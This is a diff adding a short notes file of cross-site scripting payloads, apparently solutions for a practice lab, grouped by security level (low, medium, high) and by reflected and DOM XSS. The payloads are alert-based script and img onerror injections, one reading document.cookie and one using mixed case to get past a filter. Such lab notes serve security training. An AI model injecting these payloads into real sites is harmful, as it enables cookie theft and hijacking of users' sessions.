@@ -1,0 +1,33 @@
+Security Low
+------------
+	Reflect xss :
+	--------------
+		<script>alert("hello")</script>
+		<script>alert(document.cookie)</script>
+
+	Dom xss :
+	----------
+		<img src="" onerror=alert("hello")>
+
+
+Security Medium
+----------------
+	Reflect xss :
+	-------------
+		<SCRipt>alert("hacked")</SCRIpt>
+
+	Dom xss :
+	--------
+
+
+Security High 
+-------------
+	Reflect xss :
+	--------------
+		<img src="" onerror=alert("hello")>
+
+	Dom xss :
+	---------
+		#<SCRipt>alert("hacked")</SCRIpt>
+		
+	
